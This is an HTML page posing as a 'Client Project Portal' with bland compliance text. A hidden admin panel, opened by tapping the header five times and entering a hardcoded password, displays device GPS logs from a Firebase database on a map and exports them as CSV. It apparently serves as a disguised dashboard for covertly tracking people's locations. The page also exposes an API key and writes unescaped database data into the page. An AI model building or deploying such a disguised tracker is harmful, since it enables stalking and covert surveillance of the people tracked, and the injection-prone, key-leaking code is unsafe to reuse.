<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Client Project Portal</title>
  <script src="https://www.gstatic.com/firebasejs/9.24.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.24.0/firebase-database-compat.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #f4f4f4;
    }
    header {
      background: #111;
      color: #fff;
      padding: 10px 20px;
      text-align: center;
      font-weight: bold;
    }
    .hidden-admin {
      display: none;
      padding: 20px;
    }
    .viewer {
      padding: 30px;
      background: #fff;
      text-align: center;
      font-size: 1.2em;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      background: #fff;
    }
    th, td {
      padding: 10px;
      border: 1px solid #ccc;
      text-align: center;
    }
    .map {
      height: 300px;
      margin-top: 20px;
    }
    #filterDate, #searchInput {
      margin: 10px;
      padding: 8px;
    }
    .hidden-login {
      display: none;
    }
  </style>
</head>
<body>
  <header onclick="tapSecret()">Client Project Portal</header>  <div class="viewer">
    <p><strong>Client Requirements</strong></p>
    <p>All specifications must be approved and timestamped.</p>
    <p><strong>Terms and Review</strong></p>
    <p>Final review will be automatically saved and verified upon access.</p>
    <p><strong>Legal & Compliance</strong></p>
    <p>Ensure full adherence to documentation agreements.</p>
  </div>  <div class="hidden-login" id="loginPrompt">
    <input type="password" placeholder="Enter password" id="passwordInput" />
    <button onclick="checkPassword()">Login</button>
  </div>  <div class="hidden-admin" id="adminPanel">
    <h2>Admin Dashboard</h2>
    <input type="text" id="searchInput" placeholder="Search by device or location..." />
    <input type="date" id="filterDate" />
    <button onclick="exportCSV()">Export as CSV</button>
    <p id="logCount">Daily logs: 0</p>
    <div class="map" id="map"></div>
    <table>
      <thead>
        <tr>
          <th>Device</th>
          <th>Latitude</th>
          <th>Longitude</th>
          <th>Timestamp</th>
        </tr>
      </thead>
      <tbody id="logTable"></tbody>
    </table>
  </div>  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let tapCount = 0;
    function tapSecret() {
      tapCount++;
      if (tapCount >= 5) {
        document.getElementById("loginPrompt").style.display = "block";
      }
    }

    function checkPassword() {
      const pwd = document.getElementById("passwordInput").value;
      if (pwd === "ASCII") {
        document.getElementById("adminPanel").style.display = "block";
        document.getElementById("loginPrompt").style.display = "none";
        loadLogs();
      } else {
        alert("Wrong password!");
      }
    }

    function loadLogs() {
      const table = document.getElementById("logTable");
      const logCount = document.getElementById("logCount");
      db.ref("locations").on("value", snapshot => {
        const data = snapshot.val();
        let count = 0;
        table.innerHTML = "";
        for (const devId in data) {
          for (const key in data[devId]) {
            const log = data[devId][key];
            const lat = log.lat ?? "undefined";
            const lng = log.lng ?? "undefined";
            const ts = log.timestamp ? new Date(log.timestamp).toLocaleString() : "Invalid Date";
            const search = document.getElementById("searchInput").value.toLowerCase();
            const date = document.getElementById("filterDate").value;
            const logDate = log.timestamp?.split("T")[0];
            if (
              (!search || devId.includes(search) || lat.toString().includes(search) || lng.toString().includes(search)) &&
              (!date || date === logDate)
            ) {
              const row = `<tr><td>${devId}</td><td>${lat}</td><td>${lng}</td><td>${ts}</td></tr>`;
              table.innerHTML += row;
              count++;
              addMarker({ lat: parseFloat(lat), lng: parseFloat(lng) });
            }
          }
        }
        logCount.textContent = `Daily logs: ${count}`;
      });
    }

    function exportCSV() {
      let csv = "Device,Latitude,Longitude,Timestamp\n";
      const rows = document.querySelectorAll("#logTable tr");
      rows.forEach(row => {
        const cells = row.querySelectorAll("td");
        const line = [...cells].map(cell => cell.innerText).join(",");
        csv += line + "\n";
      });
      const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
      saveAs(blob, 'location_logs.csv');
    }

    let map, markers = [];
    function initMap() {
      map = new google.maps.Map(document.getElementById("map"), {
        center: { lat: 7.5, lng: 5.2 },
        zoom: 6,
      });
    }
    function addMarker(position) {
      if (position.lat && position.lng) {
        const marker = new google.maps.Marker({ position, map });
        markers.push(marker);
      }
    }
    document.getElementById("searchInput").addEventListener("input", loadLogs);
    document.getElementById("filterDate").addEventListener("change", loadLogs);
  </script>  <script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw&callback=initMap"></script></body>
      </html>
